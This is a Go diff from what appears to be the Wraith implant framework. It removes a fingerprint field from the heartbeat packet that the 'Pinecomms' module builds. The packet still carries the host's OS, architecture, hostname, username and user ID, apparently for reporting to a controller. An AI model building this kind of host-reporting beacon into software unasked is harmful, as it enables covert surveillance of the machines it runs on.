@@ -156,7 +156,6 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 	go func() {
 		// Cache some values used in the heartbeat.
 
-		fingerprint := w.GetFingerprint()
 		strain := w.GetStrainId()
 		initTime := w.GetInitTime()
 		hostname, err := os.Hostname()
@@ -185,15 +184,14 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 			case <-time.After(time.Duration(interval) * time.Second):
 				// Build a heartbeat data packet.
 				heartbeatData := proto.PacketHeartbeat{
-					Fingerprint: fingerprint,
-					StrainId:    strain,
-					InitTime:    initTime,
-					HostOS:      runtime.GOOS,
-					HostArch:    runtime.GOARCH,
-					Hostname:    hostname,
-					HostUser:    username,
-					HostUserId:  userId,
-					Errors:      errs,
+					StrainId:   strain,
+					InitTime:   initTime,
+					HostOS:     runtime.GOOS,
+					HostArch:   runtime.GOARCH,
+					Hostname:   hostname,
+					HostUser:   username,
+					HostUserId: userId,
+					Errors:     errs,
 				}
 				heartbeatBytes, err := proto.Marshal(&heartbeatData, m.OwnPrivKey)
 				if err != nil {
